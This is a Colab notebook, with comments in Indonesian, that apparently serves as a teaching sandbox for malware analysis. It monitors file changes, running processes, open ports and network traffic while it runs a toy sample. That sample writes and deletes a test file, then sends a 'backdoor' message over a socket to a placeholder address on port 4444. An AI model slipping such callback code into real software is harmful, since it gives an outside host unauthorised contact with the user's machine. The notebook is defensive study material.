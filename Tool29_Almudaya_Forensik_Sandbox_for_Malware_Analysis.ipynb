{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMKW8tLs+qcXcis+nVgLmKI",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/elangbijak4/Security_Research/blob/main/Tool29_Almudaya_Forensik_Sandbox_for_Malware_Analysis.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install pyshark"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "b4kzI3yStpJd",
        "outputId": "988bb8a3-e2d4-4bc8-e0b4-1129e5f36797"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting pyshark\n",
            "  Downloading pyshark-0.6-py3-none-any.whl (41 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m41.4/41.4 kB\u001b[0m \u001b[31m809.2 kB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hRequirement already satisfied: lxml in /usr/local/lib/python3.10/dist-packages (from pyshark) (4.9.4)\n",
            "Requirement already satisfied: termcolor in /usr/local/lib/python3.10/dist-packages (from pyshark) (2.4.0)\n",
            "Requirement already satisfied: packaging in /usr/local/lib/python3.10/dist-packages (from pyshark) (24.1)\n",
            "Collecting appdirs (from pyshark)\n",
            "  Downloading appdirs-1.4.4-py2.py3-none-any.whl (9.6 kB)\n",
            "Installing collected packages: appdirs, pyshark\n",
            "Successfully installed appdirs-1.4.4 pyshark-0.6\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install watchdog"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gWLVvmiEtsq1",
        "outputId": "a47c2c72-f3ed-4036-e687-331709fe3a61"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting watchdog\n",
            "  Downloading watchdog-4.0.1-py3-none-manylinux2014_x86_64.whl (83 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m83.0/83.0 kB\u001b[0m \u001b[31m724.9 kB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: watchdog\n",
            "Successfully installed watchdog-4.0.1\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install psutil"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "fM7Sj5-ltv0X",
        "outputId": "4455b70a-8b9f-4b4c-ec03-488e8dee6db5"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: psutil in /usr/local/lib/python3.10/dist-packages (5.9.5)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "import subprocess\n",
        "import platform\n",
        "import psutil\n",
        "import pyshark\n",
        "from watchdog.observers import Observer\n",
        "from watchdog.events import FileSystemEventHandler\n",
        "from pathlib import Path\n",
        "import time\n",
        "import socket"
      ],
      "metadata": {
        "id": "FSstl2U8s3FJ"
      },
      "execution_count": 18,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 26,
      "metadata": {
        "id": "Ke8fCK1WsvAd"
      },
      "outputs": [],
      "source": [
        "# Direktori dan file\n",
        "MALWARE_DIR = Path(\"malware\")\n",
        "MALWARE_FILE = MALWARE_DIR / \"malware_sample.py\"\n",
        "LOG_FILE = Path(\"logs/sandbox_log.txt\")"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Direktori dan file\n",
        "MALWARE_DIR = \"malware\"\n",
        "MALWARE_FILE = os.path.join(MALWARE_DIR, \"malware_sample.py\")\n",
        "\n",
        "# Konten kode malware sederhana\n",
        "malware_code = \"\"\"\\\n",
        "import os\n",
        "import time\n",
        "import socket\n",
        "\n",
        "def create_file():\n",
        "    with open(\"malware_test.txt\", \"w\") as f:\n",
        "        f.write(\"This is a test file created by malware.\")\n",
        "\n",
        "def modify_file():\n",
        "    with open(\"malware_test.txt\", \"a\") as f:\n",
        "        f.write(\"\\\\nThis line was added by malware.\")\n",
        "\n",
        "def delete_file():\n",
        "    if os.path.exists(\"malware_test.txt\"):\n",
        "        os.remove(\"malware_test.txt\")\n",
        "\n",
        "def send_backdoor_message(ip, port, message):\n",
        "    try:\n",
        "        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
        "            s.connect((ip, port))\n",
        "            s.sendall(message.encode('utf-8'))\n",
        "            response = s.recv(1024).decode('utf-8')\n",
        "            print(f\"Received response from backdoor server: {response}\")\n",
        "    except Exception as e:\n",
        "        print(f\"Failed to send backdoor message: {str(e)}\")\n",
        "\n",
        "def main():\n",
        "    create_file()\n",
        "    time.sleep(2)\n",
        "    modify_file()\n",
        "    time.sleep(2)\n",
        "    delete_file()\n",
        "\n",
        "    # Kirim pesan backdoor ke IP dan port tertentu\n",
        "    backdoor_ip = \"192.168.1.100\"  # Ganti dengan IP yang diinginkan\n",
        "    backdoor_port = 4444           # Ganti dengan port yang diinginkan\n",
        "    message = \"Malware action completed\"\n",
        "    send_backdoor_message(backdoor_ip, backdoor_port, message)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()\n",
        "\n",
        "\"\"\"\n",
        "# Membuat direktori jika belum ada\n",
        "if not os.path.exists(MALWARE_DIR):\n",
        "    os.makedirs(MALWARE_DIR)\n",
        "\n",
        "# Menulis konten kode ke file malware_sample.py\n",
        "with open(MALWARE_FILE, \"w\") as file:\n",
        "    file.write(malware_code)\n",
        "\n",
        "print(f\"File {MALWARE_FILE} telah dibuat.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "d4Fzyit-uhXt",
        "outputId": "879354c5-4996-4da0-ed90-5d73b2386c51"
      },
      "execution_count": 27,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Tue Jul  9 11:46:53 2024: File modified: malware/malware_sample.py\n",
            "Tue Jul  9 11:46:53 2024: File modified: malware/malware_sample.py\n",
            "Tue Jul  9 11:46:53 2024: File modified: malware\n",
            "File malware/malware_sample.py telah dibuat.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Membuat direktori logs jika belum ada\n",
        "if not os.path.exists(\"logs\"):\n",
        "    os.makedirs(\"logs\")\n",
        "\n",
        "# Membuat file log kosong jika belum ada\n",
        "if not LOG_FILE.exists():\n",
        "    with open(LOG_FILE, \"w\") as f:\n",
        "        pass"
      ],
      "metadata": {
        "id": "ePjZBInjyR0N"
      },
      "execution_count": 28,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Fungsi untuk mencatat log dan mencetak ke layar\n",
        "def log(message):\n",
        "    with open(LOG_FILE, \"a\") as log_file:\n",
        "        log_file.write(f\"{time.ctime()}: {message}\\n\")\n",
        "    print(f\"{time.ctime()}: {message}\")"
      ],
      "metadata": {
        "id": "Z3xv7f-SRgVu"
      },
      "execution_count": 29,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Fungsi untuk mencatat log\n",
        "def log2(message):\n",
        "    with open(LOG_FILE, \"a\") as log_file:\n",
        "        log_file.write(f\"{time.ctime()}: {message}\\n\")"
      ],
      "metadata": {
        "id": "5V3Sbi2Hs6x4"
      },
      "execution_count": 8,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Fungsi untuk memantau proses\n",
        "def monitor_process(proc):\n",
        "    try:\n",
        "        while proc.is_running():\n",
        "            log(f\"Process {proc.pid} is running\")\n",
        "            time.sleep(1)\n",
        "    except psutil.NoSuchProcess:\n",
        "        log(f\"Process {proc.pid} terminated\")\n",
        "    except Exception as e:\n",
        "        log(f\"Error monitoring process: {str(e)}\")"
      ],
      "metadata": {
        "id": "vLhi86iPs8l0"
      },
      "execution_count": 30,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Fungsi untuk mengamati port yang terbuka\n",
        "def monitor_open_ports():\n",
        "    open_ports = []\n",
        "    for conn in psutil.net_connections():\n",
        "        if conn.status == 'LISTEN':\n",
        "            open_ports.append((conn.laddr.ip, conn.laddr.port))\n",
        "    return open_ports"
      ],
      "metadata": {
        "id": "1gDF0iAASGiK"
      },
      "execution_count": 31,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Handler untuk memantau perubahan sistem file\n",
        "class FileChangeHandler(FileSystemEventHandler):\n",
        "    def on_modified(self, event):\n",
        "        log(f\"File modified: {event.src_path}\")\n",
        "    def on_created(self, event):\n",
        "        log(f\"File created: {event.src_path}\")\n",
        "    def on_deleted(self, event):\n",
        "        log(f\"File deleted: {event.src_path}\")"
      ],
      "metadata": {
        "id": "mrHodyyOs-ko"
      },
      "execution_count": 32,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Fungsi untuk menjalankan malware dalam sandbox\n",
        "def run_malware():\n",
        "    try:\n",
        "        log(\"Starting malware execution\")\n",
        "        initial_open_ports = monitor_open_ports()\n",
        "        proc = subprocess.Popen([\"python\", MALWARE_FILE], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n",
        "\n",
        "        # Gunakan psutil untuk memantau proses\n",
        "        ps_proc = psutil.Process(proc.pid)\n",
        "        monitor_process(ps_proc)\n",
        "\n",
        "        while True:\n",
        "            output = proc.stdout.readline()\n",
        "            if output == '' and proc.poll() is not None:\n",
        "                break\n",
        "            if output:\n",
        "                log(output.strip())\n",
        "                print(output.strip())\n",
        "\n",
        "        stderr_output = proc.stderr.read()\n",
        "        if stderr_output:\n",
        "            log(stderr_output.strip())\n",
        "            print(stderr_output.strip())\n",
        "\n",
        "        stdout, stderr = proc.communicate()\n",
        "        log(f\"Malware output:\\n{stdout}\\n{stderr}\")\n",
        "\n",
        "        final_open_ports = monitor_open_ports()\n",
        "        newly_open_ports = set(final_open_ports) - set(initial_open_ports)\n",
        "        if newly_open_ports:\n",
        "            log(f\"Newly opened ports: {newly_open_ports}\")\n",
        "\n",
        "    except Exception as e:\n",
        "        log(f\"Error running malware: {str(e)}\")"
      ],
      "metadata": {
        "id": "VLstr-g7VFy-"
      },
      "execution_count": 33,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Fungsi untuk menjalankan malware dalam sandbox\n",
        "def run_malware2():\n",
        "    try:\n",
        "        log(\"Starting malware execution\")\n",
        "        proc = subprocess.Popen([\"python\", MALWARE_FILE], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n",
        "\n",
        "        # Gunakan psutil untuk memantau proses\n",
        "        ps_proc = psutil.Process(proc.pid)\n",
        "        monitor_process(ps_proc)\n",
        "\n",
        "        stdout, stderr = proc.communicate()\n",
        "        log(f\"Malware output:\\n{stdout.decode()}\\n{stderr.decode()}\")\n",
        "\n",
        "    except Exception as e:\n",
        "        log(f\"Error running malware: {str(e)}\")"
      ],
      "metadata": {
        "id": "ZcKWMoOUtAqJ"
      },
      "execution_count": 11,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Fungsi untuk menjalankan malware dalam sandbox\n",
        "def run_malware2():\n",
        "    try:\n",
        "        log(\"Starting malware execution\")\n",
        "        proc = subprocess.Popen([\"python\", MALWARE_FILE], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n",
        "\n",
        "        # Gunakan psutil untuk memantau proses\n",
        "        ps_proc = psutil.Process(proc.pid)\n",
        "        monitor_process(ps_proc)\n",
        "\n",
        "        stdout, stderr = proc.communicate()\n",
        "        log(f\"Malware output:\\n{stdout.decode()}\\n{stderr.decode()}\")\n",
        "\n",
        "        # Menulis output yang di print di layar ke file log\n",
        "        with open(LOG_FILE, \"a\") as log_file:\n",
        "            log_file.write(f\"Malware stdout:\\n{stdout.decode()}\")\n",
        "            log_file.write(f\"\\nMalware stderr:\\n{stderr.decode()}\")\n",
        "\n",
        "    except Exception as e:\n",
        "        log(f\"Error running malware: {str(e)}\")"
      ],
      "metadata": {
        "id": "d0YbuLVvP0dN"
      },
      "execution_count": 16,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Fungsi untuk menangkap lalu lintas jaringan\n",
        "def capture_network_traffic(duration=60):\n",
        "    capture = pyshark.LiveCapture(interface='eth0')\n",
        "    capture.sniff(timeout=duration)\n",
        "    for packet in capture.sniff_continuously(packet_count=10):\n",
        "        log(f\"Packet captured: {packet}\")"
      ],
      "metadata": {
        "id": "6Tog_eYAtCX3"
      },
      "execution_count": 34,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!apt-get install tshark"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "collapsed": true,
        "id": "iKY6VbHywdUD",
        "outputId": "0d1843bd-ddd1-4e1b-8cf0-fc86d51154f4"
      },
      "execution_count": 35,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "tshark is already the newest version (3.6.2-2).\n",
            "0 upgraded, 0 newly installed, 0 to remove and 45 not upgraded.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import asyncio"
      ],
      "metadata": {
        "id": "xgvEmykbw4Lo"
      },
      "execution_count": 36,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "async def capture_network_traffic_async(duration=60):\n",
        "    capture = pyshark.LiveCapture(interface='eth0')\n",
        "    await capture.sniff(timeout=duration)\n",
        "    async for packet in capture.sniff_continuously(packet_count=10):\n",
        "        log(f\"Packet captured: {packet}\")"
      ],
      "metadata": {
        "id": "Ssd1UW5HxW_Z"
      },
      "execution_count": 37,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "VgM3DoE7Vjig"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "source": [
        "if __name__ == \"__main__\":\n",
        "    # Memulai pemantauan sistem file\n",
        "    event_handler = FileChangeHandler()\n",
        "    observer = Observer()\n",
        "    observer.schedule(event_handler, path=MALWARE_DIR, recursive=True)\n",
        "    observer.start()\n",
        "\n",
        "    # Use asyncio.create_task to schedule the coroutine within the existing loop\n",
        "    asyncio.create_task(capture_network_traffic_async())\n",
        "\n",
        "    # Menjalankan malware\n",
        "    run_malware()\n",
        "\n",
        "    # Menghentikan pemantauan sistem file\n",
        "    observer.stop()\n",
        "    observer.join()\n",
        "\n",
        "    log(\"Sandbox completed\")"
      ],
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "UGRQ7PU7xnHQ",
        "outputId": "714b7a6e-9975-49cf-f8fc-30ca9b24e4e9"
      },
      "execution_count": 38,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Tue Jul  9 11:52:46 2024: Starting malware execution\n",
            "Tue Jul  9 11:52:46 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:47 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:48 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:49 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:50 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:51 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:52 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:53 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:54 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:55 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:56 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:57 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:58 2024: Process 9858 is running\n",
            "Tue Jul  9 11:52:59 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:00 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:01 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:02 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:03 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:04 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:05 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:06 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:07 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:08 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:09 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:10 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:11 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:12 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:13 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:14 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:15 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:16 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:17 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:18 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:19 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:20 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:21 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:22 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:23 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:24 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:25 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:26 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:27 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:28 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:29 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:30 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:31 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:32 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:33 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:34 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:35 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:36 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:37 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:38 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:39 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:40 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:41 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:42 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:43 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:44 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:45 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:46 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:47 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:48 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:49 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:50 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:51 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:52 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:53 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:54 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:55 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:56 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:57 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:58 2024: Process 9858 is running\n",
            "Tue Jul  9 11:53:59 2024: Process 9858 is running\n"
          ]
        },
        {
          "output_type": "error",
          "ename": "KeyboardInterrupt",
          "evalue": "",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-38-9325be464048>\u001b[0m in \u001b[0;36m<cell line: 1>\u001b[0;34m()\u001b[0m\n\u001b[1;32m     10\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     11\u001b[0m     \u001b[0;31m# Menjalankan malware\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 12\u001b[0;31m     \u001b[0mrun_malware\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     13\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     14\u001b[0m     \u001b[0;31m# Menghentikan pemantauan sistem file\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m<ipython-input-33-34a28d245d9c>\u001b[0m in \u001b[0;36mrun_malware\u001b[0;34m()\u001b[0m\n\u001b[1;32m      8\u001b[0m         \u001b[0;31m# Gunakan psutil untuk memantau proses\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      9\u001b[0m         \u001b[0mps_proc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpsutil\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mproc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mpid\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 10\u001b[0;31m         \u001b[0mmonitor_process\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mps_proc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     11\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     12\u001b[0m         \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m<ipython-input-30-4297d1ff0b03>\u001b[0m in \u001b[0;36mmonitor_process\u001b[0;34m(proc)\u001b[0m\n\u001b[1;32m      4\u001b[0m         \u001b[0;32mwhile\u001b[0m \u001b[0mproc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mis_running\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m             \u001b[0mlog\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf\"Process {proc.pid} is running\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 6\u001b[0;31m             \u001b[0mtime\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msleep\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      7\u001b[0m     \u001b[0;32mexcept\u001b[0m \u001b[0mpsutil\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mNoSuchProcess\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      8\u001b[0m         \u001b[0mlog\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf\"Process {proc.pid} terminated\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
          ]
        }
      ]
    }
  ]
}